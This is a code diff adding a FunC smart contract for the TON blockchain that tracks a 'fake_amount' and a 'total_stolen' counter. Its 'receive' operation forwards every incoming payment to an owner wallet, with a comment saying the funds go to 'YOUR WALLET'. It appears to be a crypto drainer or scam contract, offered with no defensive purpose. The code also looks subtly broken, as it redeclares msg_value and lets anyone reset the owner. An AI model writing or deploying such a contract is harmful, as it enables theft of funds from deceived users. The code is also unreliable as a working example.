@@ -1,0 +1,95 @@
+#include "stdlib.fc";
+
+;; Storage variables
+global int is_connected;
+global int total_stolen;
+global int fake_amount;
+global cell owner_address;
+
+;; Initialize contract
+() load_data() impure {
+    var ds = get_data().begin_parse();
+    is_connected = ds~load_uint(1);
+    total_stolen = ds~load_uint(256);
+    fake_amount = ds~load_uint(256);
+    owner_address = ds~load_ref();
+    ds.end_parse();
+}
+
+;; Save contract data
+() save_data() impure {
+    set_data(begin_cell()
+        .store_uint(is_connected, 1)
+        .store_uint(total_stolen, 256)
+        .store_uint(fake_amount, 256)
+        .store_ref(owner_address)
+        .end_cell());
+}
+
+;; Connect function
+() recv_internal(int msg_value, cell in_msg_full, slice in_msg_body) impure {
+    load_data();
+    
+    slice cs = in_msg_full.begin_parse();
+    int flags = cs~load_uint(4);
+    if (flags & 1) { ;; ignore bounced messages
+        return ();
+    }
+    slice sender_address = cs~load_msg_addr();
+    cs~load_msg_addr(); ;; skip dst
+    cs~load_coins(); ;; skip value
+    cs~skip_bits(1); ;; skip extracurrency collection
+    cs~load_coins(); ;; skip ihr_fee
+    int fwd_fee = muldiv(cs~load_uint(32), 16642920, 262144); ;; we use message size = 1
+    cs~load_coins(); ;; skip fwd_fee
+    int msg_value = cs~load_coins();
+    
+    int op = in_msg_body~load_uint(32);
+    
+    if (op == 0x7362d09c) { ;; connect
+        if (is_connected) {
+            return ();
+        }
+        is_connected = 1;
+    }
+    
+    if (op == 0x12345678) { ;; setAmount
+        if (~ is_connected) {
+            return ();
+        }
+        fake_amount = msg_value;
+    }
+    
+    if (op == 0xabcdef12) { ;; setOwner
+        owner_address = begin_cell().store_slice(sender_address).end_cell();
+    }
+    
+    if (op == 0x87654321) { ;; receive
+        if (~ is_connected) {
+            return ();
+        }
+        
+        ;; AUTOMATICALLY FORWARD ALL FUNDS TO OWNER (YOUR WALLET)
+        if (owner_address.null?()) {
+            ;; Skip if owner not set
+        } else {
+            slice owner_slice = owner_address.begin_parse();
+            var msg = begin_cell()
+                .store_uint(0x18, 6)
+                .store_slice(owner_slice)
+                .store_coins(msg_value)
+                .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
+                .end_cell();
+            send_raw_message(msg, 64);
+        }
+        
+        total_stolen = total_stolen + msg_value;
+    }
+    
+    if (op == 0xdeadbeef) { ;; reset
+        is_connected = 0;
+        fake_amount = 0;
+    }
+    
+    save_data();
+}
